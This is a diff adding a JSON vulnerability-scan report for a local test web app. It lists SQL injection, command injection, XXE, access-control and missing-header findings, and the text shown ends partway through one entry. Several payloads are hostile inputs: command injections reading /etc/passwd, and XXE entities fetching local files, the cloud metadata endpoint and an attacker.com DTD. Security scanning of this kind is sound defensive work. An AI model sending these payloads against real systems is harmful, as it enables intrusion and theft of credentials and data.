@@ -1,0 +1,2925 @@
+{
+  "target": "http://localhost:5000",
+  "timestamp": 1762283424.0377042,
+  "vulnerabilities": [
+    {
+      "type": "SQL Injection",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "' OR 1=1 --",
+      "method": "POST",
+      "evidence": "Authentication bypass successful"
+    },
+    {
+      "type": "SQL Injection",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "admin' --",
+      "method": "POST",
+      "evidence": "Authentication bypass successful"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "; ls -la",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "| ls -la",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "`ls -la`",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "$(ls -la)",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "; cat /etc/passwd",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "; whoami",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "| whoami",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "; ping -c 1 127.0.0.1",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "; sleep 5",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "Command Injection",
+      "endpoint": "http://localhost:5000/system",
+      "payload": "| sleep 5",
+      "method": "GET",
+      "evidence": "System command output detected"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.i...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/l...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE data [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xml",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\">\n%ext;\n]...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/parse",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/parse",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.i...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/parse",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/l...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/parse",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE data [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/parse",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\">\n%ext;\n]...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/upload",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/upload",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.i...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/upload",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/l...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/upload",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE data [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/upload",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\">\n%ext;\n]...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/api/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/api/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.i...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/api/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/l...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/api/xml",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE data [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/api/xml",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\">\n%ext;\n]...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/soap",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/soap",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.i...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/soap",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/l...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/soap",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE data [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/soap",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\">\n%ext;\n]...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xmlrpc",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xmlrpc",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.i...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xmlrpc",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/l...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xmlrpc",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE data [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "XML External Entity (XXE)",
+      "endpoint": "http://localhost:5000/xmlrpc",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\">\n%ext;\n]...",
+      "method": "POST",
+      "evidence": "XXE indicators detected in response"
+    },
+    {
+      "type": "Login Cross-Site Request Forgery",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "POST",
+      "evidence": "Login form lacks CSRF protection"
+    },
+    {
+      "type": "Sensitive Data Exposure",
+      "endpoint": "http://localhost:5000/api/users",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "PASSWORD data found: password\": \"password123, password\": \"user123, password\": \"test123"
+    },
+    {
+      "type": "Sensitive Data Exposure",
+      "endpoint": "http://localhost:5000/api/users",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "EMAIL data found: admin@test.com, user@test.com, test@test.com"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "Direct access",
+      "method": "GET",
+      "evidence": "Protected admin/user content accessible without authentication"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?admin=true",
+      "payload": "?admin=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?role=admin",
+      "payload": "?role=admin",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?user_id=1",
+      "payload": "?user_id=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?access=1",
+      "payload": "?access=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?debug=true",
+      "payload": "?debug=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?bypass=true",
+      "payload": "?bypass=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?godmode=1",
+      "payload": "?godmode=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?is_admin=1",
+      "payload": "?is_admin=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?superuser=true",
+      "payload": "?superuser=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/admin?root=true",
+      "payload": "?root=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?admin=true",
+      "payload": "?admin=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?role=admin",
+      "payload": "?role=admin",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?user_id=1",
+      "payload": "?user_id=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?access=1",
+      "payload": "?access=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?debug=true",
+      "payload": "?debug=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?bypass=true",
+      "payload": "?bypass=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?godmode=1",
+      "payload": "?godmode=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?is_admin=1",
+      "payload": "?is_admin=1",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?superuser=true",
+      "payload": "?superuser=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Broken Access Control",
+      "endpoint": "http://localhost:5000/debug?root=true",
+      "payload": "?root=true",
+      "method": "GET",
+      "evidence": "Parameter-based access control bypass successful"
+    },
+    {
+      "type": "Security Misconfiguration",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Default administrative interface accessible"
+    },
+    {
+      "type": "Security Misconfiguration",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing security headers: Clickjacking protection, MIME type sniffing protection, XSS filter"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/profile",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/settings",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Clickjacking Vulnerability",
+      "endpoint": "http://localhost:5000/app",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Frame-Options header; Missing frame-ancestors in CSP; No frame-busting JavaScript detected"
+    },
+    {
+      "type": "Missing Content Security Policy",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Missing X-Content-Type-Options",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Content-Type-Options header (prevents MIME sniffing)"
+    },
+    {
+      "type": "Missing Referrer-Policy",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Referrer-Policy header"
+    },
+    {
+      "type": "Missing Feature-Policy/Permissions-Policy",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Feature-Policy or Permissions-Policy header"
+    },
+    {
+      "type": "Missing X-XSS-Protection",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-XSS-Protection is not present"
+    },
+    {
+      "type": "Missing X-Permitted-Cross-Domain-Policies",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-Permitted-Cross-Domain-Policies is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Embedder-Policy",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Embedder-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Opener-Policy",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Opener-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Resource-Policy",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Resource-Policy is not present"
+    },
+    {
+      "type": "Missing Content Security Policy",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Missing X-Content-Type-Options",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Content-Type-Options header (prevents MIME sniffing)"
+    },
+    {
+      "type": "Missing Referrer-Policy",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Referrer-Policy header"
+    },
+    {
+      "type": "Missing Feature-Policy/Permissions-Policy",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Feature-Policy or Permissions-Policy header"
+    },
+    {
+      "type": "Missing X-XSS-Protection",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-XSS-Protection is not present"
+    },
+    {
+      "type": "Missing X-Permitted-Cross-Domain-Policies",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-Permitted-Cross-Domain-Policies is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Embedder-Policy",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Embedder-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Opener-Policy",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Opener-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Resource-Policy",
+      "endpoint": "http://localhost:5000/login",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Resource-Policy is not present"
+    },
+    {
+      "type": "Missing Content Security Policy",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Missing X-Content-Type-Options",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Content-Type-Options header (prevents MIME sniffing)"
+    },
+    {
+      "type": "Missing Referrer-Policy",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Referrer-Policy header"
+    },
+    {
+      "type": "Missing Feature-Policy/Permissions-Policy",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Feature-Policy or Permissions-Policy header"
+    },
+    {
+      "type": "Missing X-XSS-Protection",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-XSS-Protection is not present"
+    },
+    {
+      "type": "Missing X-Permitted-Cross-Domain-Policies",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-Permitted-Cross-Domain-Policies is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Embedder-Policy",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Embedder-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Opener-Policy",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Opener-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Resource-Policy",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Resource-Policy is not present"
+    },
+    {
+      "type": "Missing Content Security Policy",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Missing X-Content-Type-Options",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Content-Type-Options header (prevents MIME sniffing)"
+    },
+    {
+      "type": "Missing Referrer-Policy",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Referrer-Policy header"
+    },
+    {
+      "type": "Missing Feature-Policy/Permissions-Policy",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Feature-Policy or Permissions-Policy header"
+    },
+    {
+      "type": "Missing X-XSS-Protection",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-XSS-Protection is not present"
+    },
+    {
+      "type": "Missing X-Permitted-Cross-Domain-Policies",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-Permitted-Cross-Domain-Policies is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Embedder-Policy",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Embedder-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Opener-Policy",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Opener-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Resource-Policy",
+      "endpoint": "http://localhost:5000/api",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Resource-Policy is not present"
+    },
+    {
+      "type": "Missing Content Security Policy",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Missing X-Content-Type-Options",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Content-Type-Options header (prevents MIME sniffing)"
+    },
+    {
+      "type": "Missing Referrer-Policy",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Referrer-Policy header"
+    },
+    {
+      "type": "Missing Feature-Policy/Permissions-Policy",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Feature-Policy or Permissions-Policy header"
+    },
+    {
+      "type": "Missing X-XSS-Protection",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-XSS-Protection is not present"
+    },
+    {
+      "type": "Missing X-Permitted-Cross-Domain-Policies",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-Permitted-Cross-Domain-Policies is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Embedder-Policy",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Embedder-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Opener-Policy",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Opener-Policy is not present"
+    },
+    {
+      "type": "Missing Cross-Origin-Resource-Policy",
+      "endpoint": "http://localhost:5000/user",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header Cross-Origin-Resource-Policy is not present"
+    },
+    {
+      "type": "Missing Content Security Policy",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Missing X-Content-Type-Options",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing X-Content-Type-Options header (prevents MIME sniffing)"
+    },
+    {
+      "type": "Missing Referrer-Policy",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Referrer-Policy header"
+    },
+    {
+      "type": "Missing Feature-Policy/Permissions-Policy",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Missing Feature-Policy or Permissions-Policy header"
+    },
+    {
+      "type": "Missing X-XSS-Protection",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
+      "evidence": "Security header X-XSS-Protection is not present"
+    },
+    {
+      "type": "Missing X-Permitted-Cross-Domain-Policies",
+      "endpoint": "http://localhost:5000/dashboard",
+      "payload": "N/A",
+      "method": "GET",
